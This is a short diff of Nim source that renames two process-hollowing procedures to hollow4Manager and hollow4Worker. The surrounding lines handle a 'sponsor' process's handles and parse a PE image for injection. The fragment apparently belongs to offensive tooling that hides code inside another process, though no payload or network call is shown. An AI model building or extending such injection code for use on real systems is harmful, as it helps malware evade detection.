@@ -191,7 +191,7 @@ proc manager(sponsorProcessHandle, sponsorThreadHandle: HANDLE, peImageImageBase
         quit(1)
 
 
-proc splittedNimlineHollowManager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
+proc hollow4Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
     
     # Extract process information
     let sponsorProcessHandle = sponsorProcessInfo.hProcess
@@ -211,7 +211,7 @@ proc splittedNimlineHollowManager*(peStr: string, sponsorProcessInfo: PPROCESS_I
     discard manager(sponsorProcessHandle, sponsorThreadHandle, peImageImageBase)
 
  
-proc splittedNimlineHollowWorker*(peStr: string): bool =
+proc hollow4Worker*(peStr: string): bool =
   
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
